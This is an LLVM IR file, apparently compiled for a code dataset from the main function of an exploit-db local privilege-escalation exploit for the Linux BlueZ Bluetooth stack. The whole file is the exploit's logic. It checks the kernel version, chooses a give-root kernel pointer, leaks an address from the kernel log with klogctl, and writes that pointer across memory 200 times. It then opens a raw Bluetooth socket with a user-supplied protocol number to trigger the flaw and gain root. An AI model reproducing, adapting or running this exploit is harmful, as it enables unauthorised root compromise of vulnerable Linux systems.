; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25288.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25288.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.utsname = type { i8* }

@.str = private unnamed_addr constant [49 x i8] c"-|-local bluez exploit v.0.3  -by qobaiashi-\0A |\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c" |- couldn't determine kernel version\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c" |- i've found kernel %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"2.6.11\00", align 1
@k_give_root2 = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [6 x i8] c"2.6.4\00", align 1
@k_give_root = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [51 x i8] c" |- no supported version found..trying 2.6.4 code\0A\00", align 1
@BRKVAL = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [25 x i8] c" |- brk failed..exiting\0A\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"ecx: \00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c" |- [%0.14s]\0A\00", align 1
@.str.9 = private unnamed_addr constant [40 x i8] c" |- suitable value found!using 0x%0.9s\0A\00", align 1
@.str.10 = private unnamed_addr constant [60 x i8] c" |- the time has come to push the button... check your id!\0A\00", align 1
@AF_BLUETOOTH = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [42 x i8] c" |- something went w0rng (invalid value)\0A\00", align 1
@.str.12 = private unnamed_addr constant [15 x i8] c" |- trying...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2048 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca %struct.utsname, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %15 = bitcast i8* %14 to i32*
  store i32* %15, i32** %8, align 8
  store i8* null, i8** %12, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %17 = call i64 @uname(%struct.utsname* %13)
  %18 = icmp slt i64 %17, 0
  br i1 %18, label %19, label %21

19:                                               ; preds = %2
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  br label %39

21:                                               ; preds = %2
  %22 = getelementptr inbounds %struct.utsname, %struct.utsname* %13, i32 0, i32 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %23)
  %25 = getelementptr inbounds %struct.utsname, %struct.utsname* %13, i32 0, i32 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strstr(i8* %26, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %28 = icmp ugt i8* %27, null
  br i1 %28, label %29, label %31

29:                                               ; preds = %21
  %30 = load i8*, i8** @k_give_root2, align 8
  store i8* %30, i8** %12, align 8
  br label %31

31:                                               ; preds = %29, %21
  %32 = getelementptr inbounds %struct.utsname, %struct.utsname* %13, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i8* @strstr(i8* %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %35 = icmp ugt i8* %34, null
  br i1 %35, label %36, label %38

36:                                               ; preds = %31
  %37 = load i8*, i8** @k_give_root, align 8
  store i8* %37, i8** %12, align 8
  br label %38

38:                                               ; preds = %36, %31
  br label %39

39:                                               ; preds = %38, %19
  %40 = load i8*, i8** %12, align 8
  %41 = icmp eq i8* %40, null
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.5, i64 0, i64 0))
  %44 = load i8*, i8** @k_give_root, align 8
  store i8* %44, i8** %12, align 8
  br label %45

45:                                               ; preds = %42, %39
  %46 = load i64, i64* @BRKVAL, align 8
  %47 = inttoptr i64 %46 to i8*
  %48 = call i32 @brk(i8* %47)
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %53

50:                                               ; preds = %45
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  %52 = call i32 @exit(i32 1) #3
  unreachable

53:                                               ; preds = %45
  %54 = load i32, i32* %4, align 4
  %55 = icmp slt i32 %54, 2
  br i1 %55, label %56, label %62

56:                                               ; preds = %53
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @usage(i8* %59)
  %61 = call i32 @exit(i32 1) #3
  unreachable

62:                                               ; preds = %53
  %63 = load i32, i32* %4, align 4
  %64 = icmp eq i32 %63, 2
  br i1 %64, label %65, label %70

65:                                               ; preds = %62
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strtoul(i8* %68, i32 0, i32 0)
  store i32 %69, i32* %9, align 4
  br label %70

70:                                               ; preds = %65, %62
  %71 = load i32, i32* %4, align 4
  %72 = icmp eq i32 %71, 3
  br i1 %72, label %73, label %84

73:                                               ; preds = %70
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 1
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @strtoul(i8* %76, i32 0, i32 0)
  store i32 %77, i32* %9, align 4
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 2
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 @strtoul(i8* %80, i32 0, i32 0)
  %82 = zext i32 %81 to i64
  %83 = inttoptr i64 %82 to i32*
  store i32* %83, i32** %8, align 8
  br label %84

84:                                               ; preds = %73, %70
  %85 = call i64 (...) @fork()
  %86 = icmp ne i64 %85, 0
  br i1 %86, label %87, label %147

87:                                               ; preds = %84
  %88 = call i32 @usleep(i32 100)
  %89 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %90 = call i32 @klogctl(i32 3, i8* %89, i32 1700)
  store i32 %90, i32* %10, align 4
  %91 = icmp sgt i32 %90, -1
  br i1 %91, label %92, label %146

92:                                               ; preds = %87
  %93 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %94 = call i8* @strstr(i8* %93, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  store i8* %94, i8** %11, align 8
  %95 = load i8*, i8** %11, align 8
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0), i8* %95)
  %97 = load i8*, i8** %11, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 5
  %99 = load i8, i8* %98, align 1
  %100 = sext i8 %99 to i32
  %101 = icmp eq i32 %100, 48
  br i1 %101, label %102, label %145

102:                                              ; preds = %92
  %103 = load i8*, i8** %11, align 8
  %104 = getelementptr inbounds i8, i8* %103, i64 6
  %105 = load i8, i8* %104, align 1
  %106 = sext i8 %105 to i32
  %107 = icmp eq i32 %106, 56
  br i1 %107, label %108, label %145

108:                                              ; preds = %102
  %109 = load i8*, i8** %11, align 8
  %110 = getelementptr inbounds i8, i8* %109, i64 5
  store i8* %110, i8** %11, align 8
  %111 = load i8*, i8** %11, align 8
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.9, i64 0, i64 0), i8* %111)
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.10, i64 0, i64 0))
  %114 = load i8*, i8** %11, align 8
  %115 = getelementptr inbounds i8, i8* %114, i64 9
  store i8 0, i8* %115, align 1
  %116 = load i8*, i8** %11, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 -1
  store i8* %117, i8** %11, align 8
  store i8 120, i8* %117, align 1
  %118 = load i8*, i8** %11, align 8
  %119 = getelementptr inbounds i8, i8* %118, i32 -1
  store i8* %119, i8** %11, align 8
  store i8 48, i8* %119, align 1
  %120 = load i8*, i8** %11, align 8
  %121 = call i32 @strtoul(i8* %120, i32 0, i32 0)
  %122 = zext i32 %121 to i64
  %123 = inttoptr i64 %122 to i32*
  store i32* %123, i32** %8, align 8
  store i32 0, i32* %7, align 4
  br label %124

124:                                              ; preds = %132, %108
  %125 = load i32, i32* %7, align 4
  %126 = icmp sle i32 %125, 200
  br i1 %126, label %127, label %135

127:                                              ; preds = %124
  %128 = load i8*, i8** %12, align 8
  %129 = ptrtoint i8* %128 to i32
  %130 = load i32*, i32** %8, align 8
  %131 = getelementptr inbounds i32, i32* %130, i32 1
  store i32* %131, i32** %8, align 8
  store i32 %129, i32* %130, align 4
  br label %132

132:                                              ; preds = %127
  %133 = load i32, i32* %7, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %7, align 4
  br label %124

135:                                              ; preds = %124
  %136 = load i32, i32* @AF_BLUETOOTH, align 4
  %137 = load i32, i32* @SOCK_RAW, align 4
  %138 = load i32, i32* %9, align 4
  %139 = call i32 @socket(i32 %136, i32 %137, i32 %138)
  store i32 %139, i32* %7, align 4
  %140 = icmp slt i32 %139, 0
  br i1 %140, label %141, label %144

141:                                              ; preds = %135
  %142 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.11, i64 0, i64 0))
  %143 = call i32 @exit(i32 1) #3
  unreachable

144:                                              ; preds = %135
  br label %145

145:                                              ; preds = %144, %102, %92
  br label %146

146:                                              ; preds = %145, %87
  ret i32 0

147:                                              ; preds = %84
  %148 = call i64 (...) @fork()
  %149 = icmp eq i64 %148, 0
  br i1 %149, label %150, label %173

150:                                              ; preds = %147
  store i32 0, i32* %7, align 4
  br label %151

151:                                              ; preds = %159, %150
  %152 = load i32, i32* %7, align 4
  %153 = icmp sle i32 %152, 200
  br i1 %153, label %154, label %162

154:                                              ; preds = %151
  %155 = load i8*, i8** %12, align 8
  %156 = ptrtoint i8* %155 to i32
  %157 = load i32*, i32** %8, align 8
  %158 = getelementptr inbounds i32, i32* %157, i32 1
  store i32* %158, i32** %8, align 8
  store i32 %156, i32* %157, align 4
  br label %159

159:                                              ; preds = %154
  %160 = load i32, i32* %7, align 4
  %161 = add nsw i32 %160, 1
  store i32 %161, i32* %7, align 4
  br label %151

162:                                              ; preds = %151
  %163 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0))
  %164 = load i32, i32* @AF_BLUETOOTH, align 4
  %165 = load i32, i32* @SOCK_RAW, align 4
  %166 = load i32, i32* %9, align 4
  %167 = call i32 @socket(i32 %164, i32 %165, i32 %166)
  store i32 %167, i32* %7, align 4
  %168 = icmp slt i32 %167, 0
  br i1 %168, label %169, label %172

169:                                              ; preds = %162
  %170 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.11, i64 0, i64 0))
  %171 = call i32 @exit(i32 1) #3
  unreachable

172:                                              ; preds = %162
  br label %173

173:                                              ; preds = %172, %147
  %174 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @uname(%struct.utsname*) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @brk(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @strtoul(i8*, i32, i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @klogctl(i32, i8*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
